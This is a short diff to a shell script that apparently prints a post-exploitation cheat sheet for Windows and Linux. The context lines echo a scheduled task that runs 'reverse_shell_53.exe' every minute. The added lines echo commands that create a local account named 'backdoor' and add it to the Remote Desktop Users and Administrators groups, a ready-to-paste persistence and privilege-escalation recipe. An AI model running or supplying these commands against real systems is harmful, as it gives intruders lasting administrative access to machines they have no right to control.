@@ -67,6 +67,11 @@ echo "schtasks /create /sc minute /mo 1 /tn \"Reverse shell\" /tr \"C:\Temp\reve
 echo "schtasks /create /sc minute /mo 1 /tn \"Reverse shell\" /tr \"C:\Temp\reverse_shell_53.exe\""
 echo
 echo
+echo "net user /add \"backdoor\" \"backdoor\""
+echo "net localgroup \"Remote Desktop Users\" \"backdoor\" /add"
+echo "net localgroup Administrators \"backdoor\" /add"
+echo
+echo
 
 echo '********** Linux **********'
 echo
